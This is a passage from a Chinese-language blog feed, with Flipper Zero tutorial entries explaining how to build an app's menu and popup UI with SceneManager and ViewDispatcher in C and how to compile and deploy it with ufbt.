class="line">menu_add_item(</span><br><span class="line">    app-&gt;menu,</span><br><span class="line">    <span class="string">&quot;First popup&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    TestAppMenuSelection_One,</span><br><span class="line">    test_app_menu_callback_main_menu,</span><br><span class="line">    app);</span><br></pre></td></tr></table></figure></div><p>在這裡，我們為選單添加了一個名為「First popup」的選項，並指定當使用者選擇這個項目時會調用 <code>test_app_menu_callback_main_menu</code>，並且將選擇項目標識（<code>TestAppMenuSelection_One</code>）傳給這個回呼函式。</p></li><li><p><strong>切換到選單視圖</strong>：<br>最後一步是指示視圖調度器切換到選單視圖，讓使用者能夠看到並進行選擇：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view_dispatcher_switch_to_view(app-&gt;view_dispatcher, TestAppView_Menu);</span><br></pre></td></tr></table></figure></div></li></ol><p>到目前為止，我們的選單場景已經成功設定好並且可以開始與使用者互動了。透過這種方式，場景管理器可以輕鬆處理每個場景的進入、退出以及事件處理，而且具有乾淨、高擴展性的應用程式架構。</p><h2 id="處理場景中的事件"><a href="#處理場景中的事件" class="headerlink" title="處理場景中的事件"></a>處理場景中的事件</h2><p>當進入選單場景時，我們會遇到不同類型的事件。這些事件主要包括自定義事件、返回事件、以及時間流逝（Tick）事件。我們通過事件處理函式來處理這些事件。</p><h3 id="事件類型"><a href="#事件類型" class="headerlink" title="事件類型"></a>事件類型</h3><p>事件類型被定義為 <code>SceneManagerEventType</code>，具有三個主要值：</p><ol><li><strong>SceneManagerEventTypeCustom</strong>：這是自定義事件，用來表示像是使用者的互動或輸入等事件。</li><li><strong>SceneManagerEventTypeBack</strong>：這個事件表示使用者正試圖返回應用程式的上一個場景。如果沒有特別處理，場景管理器會自動將使用者帶回到上一個場景。</li><li><strong>SceneManagerEventTypeTick</strong>：這個事件表示時間流逝，場景應該刷新並有機會更新任何隨著時間推移而改變的數據模型。</li></ol><h3 id="處理自定義事件"><a href="#處理自定義事件" class="headerlink" title="處理自定義事件"></a>處理自定義事件</h3><p>當使用者在選單中選擇某個選項時，<code>test_app_menu_callback_main_menu</code> 會創建 <code>SceneManagerEventTypeCustom</code> 類型的事件，並通過 <code>scene_manager_handle_custom_event</code> 發送給場景管理器。這樣的事件會被傳遞到場景管理器的 <code>_on_event</code> 函式，進行處理。</p><p>這些事件包含來自 <code>TestAppEvent</code> 的值，例如 <code>TestAppEvent_ShowPopupOne</code> 或 <code>TestAppEvent_ShowPopupTwo</code>。處理邏輯如下：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> consumed = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">switch</span>(event.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> SceneManagerEventTypeCustom:</span><br><span class="line">        <span class="keyword">switch</span>(event.event) &#123;</span><br><span class="line">            <span class="keyword">case</span> TestAppEvent_ShowPopupOne:</span><br><span class="line">                scene_manager_next_scene(app-&gt;scene_manager, TestAppScene_FirstPopup);</span><br><span class="line">                consumed = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> TestAppEvent_ShowPopupTwo:</span><br><span class="line">                scene_manager_next_scene(app-&gt;scene_manager, TestAppScene_SecondPopup);</span><br><span class="line">                consumed = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        consumed = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> consumed;</span><br></pre></td></tr></table></figure></div><p>這段程式碼會根據不同的事件進行場景切換，例如當使用者選擇了第一個彈出視窗，則切換到 <code>TestAppScene_FirstPopup</code> 場景。</p><h3 id="清理場景資源"><a href="#清理場景資源" class="headerlink" title="清理場景資源"></a>清理場景資源</h3><p>當離開選單場景時，我們會調用 <code>test_app_scene_on_exit_main_menu</code>，用來清理場景的資源：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TestApp* app = context;</span><br><span class="line">menu_reset(app-&gt;menu);</span><br></pre></td></tr></table></figure></div><p>雖然在進入場景時我們也重設了選單，但在離開時再次清理資源是一個比較好的習慣，這樣可以確保場景中的資源不會長期佔用記憶體。</p><h2 id="設定彈出視窗場景"><a href="#設定彈出視窗場景" class="headerlink" title="設定彈出視窗場景"></a>設定彈出視窗場景</h2><p>與選單場景相比，彈出視窗場景的邏輯相對簡單。每個彈出視窗的主要邏輯集中在 <code>*_on_enter</code> 函式中，用來初始化視窗和設置其內容。例如，以下程式碼設置了一個彈出視窗：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">popup_reset(app-&gt;popup);</span><br><span class="line">popup_set_context(app-&gt;popup, app);</span><br><span class="line">popup_set_header(app-&gt;popup, <span class="string">&quot;Popup One&quot;</span>, <span class="number">64</span>, <span class="number">10</span>, AlignCenter, AlignTop);</span><br><span class="line">popup_set_icon(app-&gt;popup, <span class="number">10</span>, <span class="number">10</span>, &amp;I_cvc_36x36);</span><br><span class="line">popup_set_text(app-&gt;popup, <span class="string">&quot;One! One popup. Ah ah ah...&quot;</span>, <span class="number">64</span>, <span class="number">20</span>, AlignLeft, AlignTop);</span><br><span class="line">view_dispatcher_switch_to_view(app-&gt;view_dispatcher, TestAppView_Popup);</span><br></pre></td></tr></table></figure></div><p>在這裡，我們透過 <code>popup_set_header</code> 和 <code>popup_set_text</code> 設置彈出視窗的標題和內容，最後使用 <code>view_dispatcher_switch_to_view</code> 切換到彈出視窗視圖。</p><h3 id="清理彈出視窗"><a href="#清理彈出視窗" class="headerlink" title="清理彈出視窗"></a>清理彈出視窗</h3><p>當離開彈出視窗場景時，我們會調用 <code>popup_reset</code> 來清理視窗的內容，確保不再佔用記憶體。</p><h2 id="圖片資源管理"><a href="#圖片資源管理" class="headerlink" title="圖片資源管理"></a>圖片資源管理</h2><p>在程式碼中的幾個地方，我們可以看到以 <code>I_</code> 為前綴的 Icon 指標。這些指標是由 ufbt 在編譯過程中自動從 <code>images/</code> 資料夾中的資源創建出來的。</p><p>例如，在資料夾中有幾個圖像檔案：</p><ul><li><code>cvc_36x36.png</code>：這是一個 Count von Count 的小圖像，編譯後變為 <code>I_cvc_36x46</code>。</li><li><code>one.png</code>：10x10 尺寸的圖示，代表羅馬數字「i」，編譯後變為 <code>I_one</code>。</li><li><code>two.png</code>：10x10 尺寸的圖示，代表羅馬數字「ii」，編譯後變為 <code>I_two</code>。</li></ul><p>我們可以通過將更多的 1-bit PNG 檔案添加到該資料夾中，讓它們在編譯過程中被整合進應用程式，並在程式碼中以 Icon 資源的形式使用。</p><h2 id="編譯與部署"><a href="#編譯與部署" class="headerlink" title="編譯與部署"></a>編譯與部署</h2><p>首先，取得我們這邊用 instantiator.dev 在這篇部落格示範的專案示範：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/instantiator/flipper-zero-tutorial-app.git</span><br></pre></td></tr></table></figure></div><p>接著，可以開始編譯應用程式：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ufbt</span><br><span class="line">scons: Entering directory `/Users/lewiswestbury/.ufbt/current/scripts/ufbt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        CC      /Users/lewiswestbury/src/personal/test_app/test_app.c</span></span><br><span class="line"><span class="string">        CDB     /Users/lewiswestbury/src/personal/test_app/.vscode/compile_commands.json</span></span><br><span class="line"><span class="string">        LINK    /Users/lewiswestbury/.ufbt/build/test_app_d.elf</span></span><br><span class="line"><span class="string">        INSTALL /Users/lewiswestbury/src/personal/test_app/dist/debug/test_app_d.elf</span></span><br><span class="line"><span class="string">        APPMETA /Users/lewiswestbury/.ufbt/build/test_app.fap</span></span><br><span class="line"><span class="string">        FAP     /Users/lewiswestbury/.ufbt/build/test_app.fap</span></span><br><span class="line"><span class="string">        INSTALL /Users/lewiswestbury/src/personal/test_app/dist/test_app.fap</span></span><br><span class="line"><span class="string">        APPCHK  /Users/lewiswestbury/.ufbt/build/test_app.fap</span></span><br><span class="line"><span class="string">                Target: 7, API: 26.0</span></span><br></pre></td></tr></table></figure></div><p>如果我們的 ufbt 工具與 Flipper 設備上的韌體版本一致，就可以將它直接部署到 Flipper 上：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ufbt launch</span><br><span class="line">scons: Entering directory `/Users/lewiswestbury/.ufbt/current/scripts/ufbt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">python3 &quot;/Users/lewiswestbury/.ufbt/current/scripts/runfap.py&quot; -s /Users/lewiswestbury/.ufbt/build/test_app.fap -t /ext/apps/Examples/test_app.fap</span></span><br><span class="line"><span class="string">        APPCHK  /Users/lewiswestbury/.ufbt/build/test_app.fap</span></span><br><span class="line"><span class="string">                Target: 7, API: 26.0</span></span><br><span class="line"><span class="string">2023-05-06 23:38:36,824 [INFO] Using flip_Akurisau on /dev/cu.usbmodemflip_Akurisau1</span></span><br><span class="line"><span class="string">2023-05-06 23:38:36,877 [INFO] Installing &quot;/Users/lewiswestbury/.ufbt/build/test_app.fap&quot; to /ext/apps/Examples/test_app.fap</span></span><br><span class="line"><span class="string">2023-05-06 23:38:36,916 [INFO] Sending &quot;/Users/lewiswestbury/.ufbt/build/test_app.fap&quot; to &quot;/ext/apps/Examples/test_app.fap&quot;</span></span><br><span class="line"><span class="string">100%, chunk 1 of 1</span></span><br><span class="line"><span class="string">2023-05-06 23:38:37,108 [INFO] Launching app: &quot;Applications&quot; /ext/apps/Examples/test_app.fap</span></span><br></pre></td></tr></table></figure></div><p>如果韌體版本與 ufbt 工具不一致，Flipper 會告訴我們。此時可以透過以下指令更新開發工具的 SDK：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufbt update --channel=[dev|rc|release]</span><br></pre></td></tr></table></figure></div><p>或者可以使用 qFlipper 來更新 Flipper 的韌體，或者使用以下指令進行 USB 刷入：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufbt flash_usb</span><br></pre></td></tr></table></figure></div><p>如果使用的是 ST-link，也可以使用以下指令：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufbt flash</span><br></pre></td></tr></table></figure></div><h2 id="整合所有部分"><a href="#整合所有部分" class="headerlink" title="整合所有部分"></a>整合所有部分</h2><p>通過本次的教學，我們已經介紹了如何為 Flipper Zero 應用程式初始化與啟動簡單的使用者介面。</p><p>作者提供完整的教學程式碼可以在文章最後的 References 找到，他鼓勵大家可以自由使用該專案的程式碼進行學習與修改。也建議各位去看看他的教學，並參考其他教學資源，進一步加深對 Flipper Zero 介面開發的了解。</p><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>instantiator.dev 的教學我們已經完成了，明天我們會把健身海豚教練開發完成，並結束今年的鐵人賽挑戰！<br>各位期待明天最後一篇吧！</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://instantiator.dev/post/flipper-zero-app-tutorial-02/" >https://instantiator.dev/post/flipper-zero-app-tutorial-02/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://github.com/instantiator/flipper-zero-tutorial-app" >https://github.com/instantiator/flipper-zero-tutorial-app <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Cover&quot;&gt;&lt;a href=&quot;#Cover&quot; class=&quot;headerlink&quot; title=&quot;Cover&quot;&gt;&lt;/a&gt;Cover&lt;/h2&gt;&lt;p&gt;&lt;img  
                     lazyload
                     </summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day28 - 會寫完喔！倒數 48 小時的勝利宣言，即將踏上終點的鐵人賽之旅！</title>
    <link href="https://kazma.tw/2024/10/12/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day28/"/>
    <id>https://kazma.tw/2024/10/12/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day28/</id>
    <published>2024-10-12T13:17:31.017Z</published>
    <updated>2024-10-27T09:34:56.609Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Cover"><a href="#Cover" class="headerlink" title="Cover"></a>Cover</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://artprojectsforkids.org/wp-content/uploads/2024/04/Draw-a-dolphin-web.jpg"                      alt="cover"                ><br>圖片來源：<a class="link"   href="https://artprojectsforkids.org/how-to-draw-a-dolphin/" >https://artprojectsforkids.org/how-to-draw-a-dolphin/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的<br>一部分。</p><h2 id="開發倒數-48-小時"><a href="#開發倒數-48-小時" class="headerlink" title="開發倒數 48 小時"></a>開發倒數 48 小時</h2><h3 id="SceneManager-and-ViewDispatcher"><a href="#SceneManager-and-ViewDispatcher" class="headerlink" title="SceneManager and ViewDispatcher"></a>SceneManager and ViewDispatcher</h3><p>我們要繼續提到 SceneManager 透過一系列的 <code>scene_manager_*</code> 開頭的函式來管理應用程式中的所有場景細節。主要是確保當進入場景、離開場景或接收到新事件時，相關的處理函式會被正確的呼叫。<br>另一個是 ViewDispatcher 是使用許多 <code>view_dispatcher_*</code> 的函式來管理 views。這些函式會在 SceneManager 中被呼叫。總之，ViewDispatcher 是負責處理場景中 Views 的顯示和管理。<br>當我們在定義應用程式場景時，應提供所有場景處理函式作為一個 SceneManagerHandlers 結構傳給 <code>scene_manager_alloc</code> 函式。例如說作者這邊的場景會用數字做為索引，同時為了方便追蹤這些場景，通常我們會定義一個 enum 類型來表示場景的索引，像是：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    TestAppScene_MainMenu,      <span class="comment">// 主選單場景</span></span><br><span class="line">    TestAppScene_FirstPopup,    <span class="comment">// 第一個彈出視窗場景</span></span><br><span class="line">    TestAppScene_SecondPopup,   <span class="comment">// 第二個彈出視窗場景</span></span><br><span class="line">    TestAppScene_count          <span class="comment">// 場景計數，方便後續擴展</span></span><br><span class="line">&#125; TestAppScene;</span><br></pre></td></tr></table></figure></div><p>像是這邊的 count 只要放在枚舉的最後一項，之後增加或是修改場景數量的時候都可以輕鬆算出場景的總數。</p><p>而視圖是可以重複使用的，因此應用程式中可能場景數量會比視圖更多。換句話說，我們有可能一個視圖對應多個場景：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    TestAppView_Menu,   <span class="comment">// 菜單視圖</span></span><br><span class="line">    TestAppView_Popup   <span class="comment">// 彈出視圖</span></span><br><span class="line">&#125; TestAppScene;</span><br></pre></td></tr></table></figure></div><p>這樣也提高了資源利用率。</p><h3 id="初始化應用程式"><a href="#初始化應用程式" class="headerlink" title="初始化應用程式"></a>初始化應用程式</h3><p>首先我們會在 <code>test_app_init</code> 函式裡面初始化 scene manager 以及 view dispatcher：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TestApp* app = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(TestApp));</span><br><span class="line">test_app_scene_manager_init(app);</span><br><span class="line">test_app_view_dispatcher_init(app);</span><br></pre></td></tr></table></figure></div><h3 id="設定-Scene-Manager"><a href="#設定-Scene-Manager" class="headerlink" title="設定 Scene Manager"></a>設定 Scene Manager</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app-&gt;scene_manager = scene_manager_alloc(&amp;test_app_scene_event_handlers, app);</span><br></pre></td></tr></table></figure></div><p>我們為 SceneManager 分配記憶體。<br>其中這邊的第二個參數是 context，當場景處理方法被調用時，會回傳這個 context，第一個參數是 <code>SceneManagerHandlers* test_app_scene_event_handlers</code> 已經提前定義好並包含 <code>on_enter</code>、<code>on_exit</code>、<code>on_event</code> 處理函式集合。</p><h3 id="處理函式集合"><a href="#處理函式集合" class="headerlink" title="處理函式集合"></a>處理函式集合</h3><p><code>on_enter_handlers</code>：當進入某個場景時會調用這個處理函式集合，它包含了所有場景的進入處理邏輯。這些函式與定義的 enum 順序一致。例如，進入主選單或彈出視窗時會調用對應的進入函數。</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*<span class="type">const</span> test_app_scene_on_enter_handlers[])(<span class="type">void</span>*) = &#123;</span><br><span class="line">    test_app_scene_on_enter_main_menu,</span><br><span class="line">    test_app_scene_on_enter_popup_one,</span><br><span class="line">    test_app_scene_on_enter_popup_two&#125;;</span><br></pre></td></tr></table></figure></div><p><code>on_event_handlers</code>：當某個場景處於活動狀態時，並且收到了事件（如使用者操作），會調用這個事件處理函式集合。每個場景有其專屬的事件處理邏輯，也是與 enum 順序一致。</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> (*<span class="type">const</span> test_app_scene_on_event_handlers[])(<span class="type">void</span>*, SceneManagerEvent) = &#123;</span><br><span class="line">    test_app_scene_on_event_main_menu,</span><br><span class="line">    test_app_scene_on_event_popup_one,</span><br><span class="line">    test_app_scene_on_event_popup_two&#125;;</span><br></pre></td></tr></table></figure></div><p><code>on_exit_handlers</code>：當離開某個場景時，會調用這個處理函式集合。這些函式負責處理場景退出時的清理或其他工作，同樣是與 enum 順序保持一致。</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*<span class="type">const</span> test_app_scene_on_exit_handlers[])(<span class="type">void</span>*) = &#123;</span><br><span class="line">    test_app_scene_on_exit_main_menu,</span><br><span class="line">    test_app_scene_on_exit_popup_one,</span><br><span class="line">    test_app_scene_on_exit_popup_two&#125;;</span><br></pre></td></tr></table></figure></div><p><code>test_app_scene_event_handlers</code>：這是所有場景處理器的集合，包含 <code>on_enter</code>、<code>on_event</code> 和 <code>on_exit</code> 的處理函數。這樣的結構可以確保每個場景的進入、事件處理和退出邏輯都能正確運行。</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> SceneManagerHandlers test_app_scene_event_handlers = &#123;</span><br><span class="line">    .on_enter_handlers = test_app_scene_on_enter_handlers,   <span class="comment">// 進入處理函式集合</span></span><br><span class="line">    .on_event_handlers = test_app_scene_on_event_handlers,   <span class="comment">// 事件處理函式集合</span></span><br><span class="line">    .on_exit_handlers = test_app_scene_on_exit_handlers,     <span class="comment">// 退出處理函式集合</span></span><br><span class="line">    .scene_num = TestAppScene_count&#125;;                       <span class="comment">// 場景數量</span></span><br></pre></td></tr></table></figure></div><h2 id="設定-View-Dispatcher"><a href="#設定-View-Dispatcher" class="headerlink" title="設定 View Dispatcher"></a>設定 View Dispatcher</h2><p><code>test_app_view_dispatcher_init</code> 函式負責初始化視圖分發器，這部分稍微複雜一點。具體的步驟如下：</p><ol><li>首先我們要先分配一個視圖分發器，用來管理應用程式中的不同視圖：<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app-&gt;view_dispatcher = view_dispatcher_alloc();</span><br></pre></td></tr></table></figure></div></li><li>接著，我們需要啟用隊列功能，讓視圖分發器能夠依序處理事件。<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view_dispatcher_enable_queue(app-&gt;view_dispatcher);</span><br></pre></td></tr></table></figure></div></li><li>然後我們需要為應用程式中的各個視圖分配記憶體，這裡我們分別為菜單和彈出視窗進行分配：<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app-&gt;menu = menu_alloc();</span><br><span class="line">app-&gt;popup = popup_alloc();</span><br></pre></td></tr></table></figure></div></li><li>接著我們將事件從視圖傳遞到場景管理器，因為視圖本身會處理事件和導航功能，但我們希望這些事件能夠傳遞到場景管理器，使得目前處於活躍狀態的場景能夠接收到並處理這些事件。因此我們需要設置事件回調函式來將事件傳遞到場景管理器。<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 設置回調函式，將事件從視圖傳遞到場景管理器</span></span><br><span class="line">view_dispatcher_set_event_callback_context(app-&gt;view_dispatcher, app);</span><br><span class="line">view_dispatcher_set_custom_event_callback(</span><br><span class="line">    app-&gt;view_dispatcher,</span><br><span class="line">    test_app_scene_manager_custom_event_callback);</span><br><span class="line">view_dispatcher_set_navigation_event_callback(</span><br><span class="line">    app-&gt;view_dispatcher,</span><br><span class="line">    test_app_scene_manager_navigation_event_callback);</span><br></pre></td></tr></table></figure></div></li><li>最後，我們需要將視圖註冊到視圖分發器，並且將它們與各自的列舉值進行對應。這樣，當我們需要切換到特定視圖時，系統能夠正確處理視圖之間的切換。<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 將視圖添加到分發器，並根據它們的列舉值進行索引</span></span><br><span class="line">view_dispatcher_add_view(</span><br><span class="line">    app-&gt;view_dispatcher,</span><br><span class="line">    TestAppView_Menu,</span><br><span class="line">    menu_get_view(app-&gt;menu));</span><br><span class="line"></span><br><span class="line">view_dispatcher_add_view(</span><br><span class="line">    app-&gt;view_dispatcher,</span><br><span class="line">    TestAppView_Popup,</span><br><span class="line">    popup_get_view(app-&gt;popup));</span><br></pre></td></tr></table></figure></div></li></ol><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>今天就先到這邊，預計明天走完教學，後天做出自已的 app。<br>各位明天見！</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://instantiator.dev/post/flipper-zero-app-tutorial-02/" >https://instantiator.dev/post/flipper-zero-app-tutorial-02/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Cover&quot;&gt;&lt;a href=&quot;#Cover&quot; class=&quot;headerlink&quot; title=&quot;Cover&quot;&gt;&lt;/a&gt;Cover&lt;/h2&gt;&lt;p&gt;&lt;img  
                     lazyload
                     </summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day27 - 死線逼近！強制切回生存模式的 72 小時開發極限挑戰！</title>
    <link href="https://kazma.tw/2024/10/11/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day27/"/>
    <id>https://kazma.tw/2024/10/11/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day27/</id>
    <published>2024-10-11T13:53:01.219Z</published>
    <updated>2024-10-27T09:34:38.325Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Cover"><a href="#Cover" class="headerlink" title="Cover"></a>Cover</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackster.imgix.net/uploads/attachments/1374483/image_sveSs9T3Mx.png?auto=compress,format&w=830&h=466.875&fit=min&dpr=2"                      alt="dolphin"                ><br>圖片來源：<a class="link"   href="https://www.hackster.io/news/the-flipper-zero-pocket-cyberdolphin-multi-tool-device-for-geeks-enters-mass-production-8523b2d96d96" >https://www.hackster.io/news/the-flipper-zero-pocket-cyberdolphin-multi-tool-device-for-geeks-enters-mass-production-8523b2d96d96 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的<br>一部分。</p><h2 id="接著開發"><a href="#接著開發" class="headerlink" 